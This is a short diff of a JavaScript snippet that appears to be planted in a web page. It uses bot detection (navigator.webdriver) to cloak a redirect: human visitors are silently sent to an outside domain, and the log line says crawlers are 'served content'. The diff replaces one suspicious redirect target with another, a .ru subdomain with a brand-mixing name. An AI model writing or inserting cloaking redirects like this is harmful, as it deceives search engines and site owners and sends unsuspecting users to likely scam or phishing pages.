@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://k9zs.shop/3/rd.php?url=/t/RMadvOfg");
+  window.location.replace("https://kinare.smotrim-lostfilm.ru/Florist-2026-R4cs");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
